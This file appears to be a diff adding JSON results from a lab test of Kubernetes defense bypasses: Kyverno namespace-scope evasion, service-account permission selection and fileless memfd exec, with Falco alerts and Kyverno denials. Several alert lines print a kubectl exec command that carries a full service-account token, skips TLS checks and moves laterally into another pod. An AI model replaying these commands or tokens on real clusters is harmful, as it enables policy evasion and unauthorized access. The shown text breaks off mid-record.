@@ -1,0 +1,1663 @@
+{
+  "schema": "inkblade-defense-bypass-path/v1",
+  "generated_at": "2026-10-27T09:58:50Z",
+  "techniques": [
+    {
+      "id": "namespace-scope-evasion",
+      "product": "admission",
+      "action": "privileged Pod in default (outside Kyverno match scope) â†’ hostPath marker on node",
+      "marker": "INKBLADE-BENIGN:defense-bypass:node:100447",
+      "marker_achieved": true,
+      "control": {
+        "namespace": "defense-lab",
+        "denied": true,
+        "rc": 1
+      },
+      "alerts": [
+        {
+          "source": "falco",
+          "time": "10:04:15.143252590",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.162:38670->10.43.0.1:443 lport=38670 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe collect --read-only --max-output 8388608 terminal=0 container_id=dfb1f9deb782 container_name=probe container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=posture-recon k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.162:38670->10.43.0.1:443",
+            "lport": "38670",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "inkblade-probe",
+            "proc_exepath": "/opt/inkblade/inkblade-probe",
+            "parent": "containerd-shim",
+            "command": "inkblade-probe collect --read-only --max-output 8388608",
+            "terminal": "0",
+            "container_id": "dfb1f9deb782",
+            "container_name": "probe",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "posture-recon",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:04:15.143252590: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.162:38670->10.43.0.1:443 lport=38670 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe collect --read-only --max-output 8388608 terminal=0 container_id=dfb1f9deb782 container_name=probe container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=posture-recon k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        }
+      ],
+      "denials": [
+        {
+          "source": "kyverno",
+          "webhook": "vpol.validate.kyverno.svc-fail-finegrained-defense-lab-disallow-hostpath",
+          "policy": "defense-lab-disallow-hostpath",
+          "message": "hostPath volumes are disallowed in defense-lab.",
+          "raw": "Error from server: error when creating \"STDIN\": admission webhook \"vpol.validate.kyverno.svc-fail-finegrained-defense-lab-disallow-hostpath\" denied the request: Policy defense-lab-disallow-hostpath failed: hostPath volumes are disallowed in defense-lab."
+        },
+        {
+          "source": "kyverno",
+          "webhook": "vpol.validate.kyverno.svc-fail-finegrained-defense-lab-disallow-privileged",
+          "policy": "defense-lab-disallow-privileged",
+          "message": "Privileged mode is disallowed in defense-lab.",
+          "raw": "Error from server: error when creating \"/root/control-privileged.yaml\": admission webhook \"vpol.validate.kyverno.svc-fail-finegrained-defense-lab-disallow-privileged\" denied the request: Policy defense-lab-disallow-privileged failed: Privileged mode is disallowed in defense-lab."
+        }
+      ],
+      "result": "bypass-confirmed",
+      "limitations": "Kyverno 1.19.2 policies are scoped by matchConditions request.namespace == 'defense-lab'; default is outside the scope. This is a scope bypass, not an engine bypass."
+    },
+    {
+      "id": "sa-permission-selection",
+      "product": "admission/falco",
+      "action": "SSAR (SelfSubjectAccessReview) for pods/exec from the attacker SA",
+      "marker_achieved": true,
+      "alerts": [
+        {
+          "source": "falco",
+          "time": "10:05:38.640783350",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.163:53854->10.43.0.1:443 lport=53854 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000 terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.163:53854->10.43.0.1:443",
+            "lport": "53854",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "inkblade-probe",
+            "proc_exepath": "/opt/inkblade/inkblade-probe",
+            "parent": "containerd-shim",
+            "command": "inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000",
+            "terminal": "0",
+            "container_id": "4b0c69e5aee4",
+            "container_name": "attacker",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "memfd-attacker",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:05:38.640783350: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.163:53854->10.43.0.1:443 lport=53854 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000 terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        },
+        {
+          "source": "falco",
+          "time": "10:05:38.783529803",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.163:53862->10.43.0.1:443 lport=53862 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000 terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.163:53862->10.43.0.1:443",
+            "lport": "53862",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "inkblade-probe",
+            "proc_exepath": "/opt/inkblade/inkblade-probe",
+            "parent": "containerd-shim",
+            "command": "inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000",
+            "terminal": "0",
+            "container_id": "4b0c69e5aee4",
+            "container_name": "attacker",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "memfd-attacker",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:05:38.783529803: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.163:53862->10.43.0.1:443 lport=53862 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000 terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        },
+        {
+          "source": "falco",
+          "time": "10:05:38.929981729",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.163:53874->10.43.0.1:443 lport=53874 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000 terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.163:53874->10.43.0.1:443",
+            "lport": "53874",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "inkblade-probe",
+            "proc_exepath": "/opt/inkblade/inkblade-probe",
+            "parent": "containerd-shim",
+            "command": "inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000",
+            "terminal": "0",
+            "container_id": "4b0c69e5aee4",
+            "container_name": "attacker",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "memfd-attacker",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:05:38.929981729: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.163:53874->10.43.0.1:443 lport=53874 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000 terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        },
+        {
+          "source": "falco",
+          "time": "10:06:07.346427753",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.163:60544->10.43.0.1:443 lport=60544 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:memfd:100537 > /tmp/lateral.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.163:60544->10.43.0.1:443",
+            "lport": "60544",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "kubectl",
+            "proc_exepath": "/opt/inkblade/kubectl",
+            "parent": "inkblade-probe",
+            "terminal": "0",
+            "container_id": "4b0c69e5aee4",
+            "container_name": "attacker",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "memfd-attacker",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:06:07.346427753: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.163:60544->10.43.0.1:443 lport=60544 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:memfd:100537 > /tmp/lateral.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        },
+        {
+          "source": "falco",
+          "time": "10:06:14.023255363",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.163:60554->10.43.0.1:443 lport=60554 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:memfd:100537 > /tmp/lateral.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.163:60554->10.43.0.1:443",
+            "lport": "60554",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "kubectl",
+            "proc_exepath": "/opt/inkblade/kubectl",
+            "parent": "inkblade-probe",
+            "terminal": "0",
+            "container_id": "4b0c69e5aee4",
+            "container_name": "attacker",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "memfd-attacker",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:06:14.023255363: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.163:60554->10.43.0.1:443 lport=60554 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=kubectl proc_exepath=/opt/inkblade/kubectl parent=inkblade-probe command=kubectl --server=https://kubernetes.default.svc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik13d2lHUEVTeGllUGpwOV9faWplalN4dWU4eHN5alFHWUQ1bnFjN0lWakkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODI0NjMxMzkyLCJpYXQiOjE3OTMwOTUzOTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjliNzA1NjUtODdiYS00MDZhLTk2M2UtZWE4ZmIwNTZkZjE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ0cmlkZW50LWJ5cGFzcyIsIm5vZGUiOnsibmFtZSI6ImszcyIsInVpZCI6ImE0MmMwZTZlLTFlMWQtNDIxMy05MmQ0LTllZWFlZjJmNGY2ZCJ9LCJwb2QiOnsibmFtZSI6Im1lbWZkLWF0dGFja2VyIiwidWlkIjoiOTA0YmU0MjgtOTU0OC00NmI0LWEzOTctNTA3YjU4ZDMwNzFmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJieXBhc3MtZXhlYyIsInVpZCI6ImQ4MmU0OTEyLWMwNzAtNDRkOS05MzA3LThkZjA0NjRlNzQ5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3OTMwOTg5OTl9LCJuYmYiOjE3OTMwOTUzOTIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDp0cmlkZW50LWJ5cGFzczpieXBhc3MtZXhlYyJ9.SFSoMrVdN6YqbkoCjN-m0qKz_46lpzFD-rwKuWLyLTx5QohC4N1aF6J75QHAfjBaua3N6SSgyQLFnwyZKDSpcsfmS8hSzolJH8L_c_LQFNXRQdqKcXN8X8R3DhYul73WNNvrPdkDDRwLLlz4sePoofU1yaR3TYaM-1a4c9nFrD3g-GgS57CU9zTDB4A7JLrQ9Fn12NQdYib79pVKvJCD9W7abuV_5nHbUUlHE_Vv36FsH3jyE-_FwL-bCjM1S4jvT5PlO4YlNGKYKoZ2gHppaxaRjrrOWdESdnaWBE0QGSDocXqHz99ao_8XOzGTHgeGcFVdSybGvhRbehAS97tNUA --insecure-skip-tls-verify exec -n trident-target lateral-target -- /bin/sh -c echo INKBLADE-BENIGN:defense-bypass:memfd:100537 > /tmp/lateral.marker terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        }
+      ],
+      "denials": [],
+      "result": "detected",
+      "limitations": "Selects an already-authorized SA; it does not escalate RBAC. The lab Role grants pods/exec in trident-target only. A Falco K8s API contact alert makes this observable.",
+      "detail": {
+        "schema": "inkblade-bypass/1",
+        "ok": true,
+        "technique_id": "",
+        "techniques": [
+          "sa-permission-selection"
+        ],
+        "executions": [
+          {
+            "technique": "sa-permission-selection",
+            "ok": true,
+            "subject": "system:serviceaccount:trident-bypass:bypass-exec",
+            "claims": {
+              "aud": [
+                "https://kubernetes.default.svc.cluster.local",
+                "k3s"
+              ],
+              "exp": 1824631392,
+              "iat": 1793095392,
+              "iss": "https://kubernetes.default.svc.cluster.local",
+              "jti": "29b70565-87ba-406a-963e-ea8fb056df14",
+              "kubernetes.io": {
+                "namespace": "trident-bypass",
+                "node": {
+                  "name": "k3s",
+                  "uid": "a42c0e6e-1e1d-4213-92d4-9eeaef2f4f6d"
+                },
+                "pod": {
+                  "name": "memfd-attacker",
+                  "uid": "904be428-9548-46b4-a397-507b58d3071f"
+                },
+                "serviceaccount": {
+                  "name": "bypass-exec",
+                  "uid": "d82e4912-c070-44d9-9307-8df0464e749e"
+                },
+                "warnafter": 1793098999
+              },
+              "nbf": 1793095392,
+              "sub": "system:serviceaccount:trident-bypass:bypass-exec"
+            },
+            "namespace": "trident-target",
+            "allowed": [
+              "pods/exec",
+              "pods"
+            ],
+            "checks": [
+              {
+                "action": "pods/exec",
+                "allowed": true,
+                "reason": "RBAC: allowed by RoleBinding \"bypass-exec-pods/trident-target\" of Role \"bypass-exec-pods\" to ServiceAccount \"bypass-exec/trident-bypass\""
+              },
+              {
+                "action": "pods",
+                "allowed": true,
+                "reason": "RBAC: allowed by RoleBinding \"bypass-exec-pods/trident-target\" of Role \"bypass-exec-pods\" to ServiceAccount \"bypass-exec/trident-bypass\""
+              },
+              {
+                "action": "secrets",
+                "allowed": false,
+                "reason": null
+              }
+            ],
+            "selected_action": "pods/exec"
+          }
+        ],
+        "fileless": false,
+        "artifact_paths": [],
+        "selected_path": null,
+        "scope": null,
+        "service_account": {
+          "technique": "sa-permission-selection",
+          "ok": true,
+          "subject": "system:serviceaccount:trident-bypass:bypass-exec",
+          "claims": {
+            "aud": [
+              "https://kubernetes.default.svc.cluster.local",
+              "k3s"
+            ],
+            "exp": 1824631392,
+            "iat": 1793095392,
+            "iss": "https://kubernetes.default.svc.cluster.local",
+            "jti": "29b70565-87ba-406a-963e-ea8fb056df14",
+            "kubernetes.io": {
+              "namespace": "trident-bypass",
+              "node": {
+                "name": "k3s",
+                "uid": "a42c0e6e-1e1d-4213-92d4-9eeaef2f4f6d"
+              },
+              "pod": {
+                "name": "memfd-attacker",
+                "uid": "904be428-9548-46b4-a397-507b58d3071f"
+              },
+              "serviceaccount": {
+                "name": "bypass-exec",
+                "uid": "d82e4912-c070-44d9-9307-8df0464e749e"
+              },
+              "warnafter": 1793098999
+            },
+            "nbf": 1793095392,
+            "sub": "system:serviceaccount:trident-bypass:bypass-exec"
+          },
+          "namespace": "trident-target",
+          "allowed": [
+            "pods/exec",
+            "pods"
+          ],
+          "checks": [
+            {
+              "action": "pods/exec",
+              "allowed": true,
+              "reason": "RBAC: allowed by RoleBinding \"bypass-exec-pods/trident-target\" of Role \"bypass-exec-pods\" to ServiceAccount \"bypass-exec/trident-bypass\""
+            },
+            {
+              "action": "pods",
+              "allowed": true,
+              "reason": "RBAC: allowed by RoleBinding \"bypass-exec-pods/trident-target\" of Role \"bypass-exec-pods\" to ServiceAccount \"bypass-exec/trident-bypass\""
+            },
+            {
+              "action": "secrets",
+              "allowed": false,
+              "reason": null
+            }
+          ],
+          "selected_action": "pods/exec"
+        },
+        "benign": true,
+        "no_new_binary": false
+      }
+    },
+    {
+      "id": "fileless-memfd-exec",
+      "product": "falco",
+      "action": "memfd script â†’ kubectl pods/exec into lateral-target",
+      "marker": "INKBLADE-BENIGN:defense-bypass:memfd:100537",
+      "marker_achieved": true,
+      "alerts": [
+        {
+          "source": "falco",
+          "time": "10:05:38.640783350",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
+          "detail": "connection=10.42.0.163:53854->10.43.0.1:443 lport=53854 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000 terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "fields": {
+            "connection": "10.42.0.163:53854->10.43.0.1:443",
+            "lport": "53854",
+            "rport": "443",
+            "fd_type": "ipv4",
+            "fd_proto": "tcp",
+            "evt_type": "connect",
+            "user": "root",
+            "user_uid": "0",
+            "user_loginuid": "-1",
+            "process": "inkblade-probe",
+            "proc_exepath": "/opt/inkblade/inkblade-probe",
+            "parent": "containerd-shim",
+            "command": "inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000",
+            "terminal": "0",
+            "container_id": "4b0c69e5aee4",
+            "container_name": "attacker",
+            "container_image_repository": "docker.io/library/alpine",
+            "container_image_tag": "3.21",
+            "k8s_pod_name": "memfd-attacker",
+            "k8s_ns_name": "trident-bypass"
+          },
+          "raw": "10:05:38.640783350: Notice Unexpected connection to K8s API Server from container | connection=10.42.0.163:53854->10.43.0.1:443 lport=53854 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=inkblade-probe proc_exepath=/opt/inkblade/inkblade-probe parent=containerd-shim command=inkblade-probe bypass --plan /opt/inkblade/plan-sa.json --max-timeout-ms 180000 terminal=0 container_id=4b0c69e5aee4 container_name=attacker container_image_repository=docker.io/library/alpine container_image_tag=3.21 k8s_pod_name=memfd-attacker k8s_ns_name=trident-bypass",
+          "technique_ids": [
+            "sa-permission-selection"
+          ]
+        },
+        {
+          "source": "falco",
+          "time": "10:05:38.783529803",
+          "priority": "Notice",
+          "rule": "Unexpected connection to K8s API Server from container",
